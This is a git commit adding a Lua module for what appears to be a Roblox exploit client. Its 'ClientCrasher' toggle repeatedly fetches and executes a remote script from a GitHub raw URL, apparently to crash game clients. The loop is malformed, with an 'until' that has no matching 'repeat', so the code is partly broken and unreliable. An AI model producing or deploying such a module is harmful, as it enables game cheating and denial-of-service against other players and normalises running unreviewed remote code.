dca55d955a1a110cf9cb6a021371bf89f3b6d74e
starsdotspace <nebulawareconfigsalt@gmail.com>
2024-10-11 22:11:49 -0700

    Create CrasherModule.lua

---
+++ CrasherModule.lua
@@ -0,0 +1,18 @@
+run(function()
+    local ClientCrasher = GuiLibrary.ObjectsThatCanBeSaved.UtilityWindow.Api.CreateOptionsButton({
+        Name = 'ClientCrasher',
+        Function = function(call)
+            if call then
+              loadstring(game:HttpGet("https://raw.githubusercontent.com/starsdotspace/Crasher/refs/heads/main/Crasher.lua", true))()
+			        loadstring(game:HttpGet("https://raw.githubusercontent.com/starsdotspace/Crasher/refs/heads/main/Crasher.lua", true))()
+			        loadstring(game:HttpGet("https://raw.githubusercontent.com/starsdotspace/Crasher/refs/heads/main/Crasher.lua", true))()
+			        loadstring(game:HttpGet("https://raw.githubusercontent.com/starsdotspace/Crasher/refs/heads/main/Crasher.lua", true))()
+			        loadstring(game:HttpGet("https://raw.githubusercontent.com/starsdotspace/Crasher/refs/heads/main/Crasher.lua", true))()
+			        loadstring(game:HttpGet("https://raw.githubusercontent.com/starsdotspace/Crasher/refs/heads/main/Crasher.lua", true))()
+			        loadstring(game:HttpGet("https://raw.githubusercontent.com/starsdotspace/Crasher/refs/heads/main/Crasher.lua", true))()
+			        loadstring(game:HttpGet("https://raw.githubusercontent.com/starsdotspace/Crasher/refs/heads/main/Crasher.lua", true))()
+            end
+          until not ClientCrasher.Enabled
+        end
+      })
+      end)
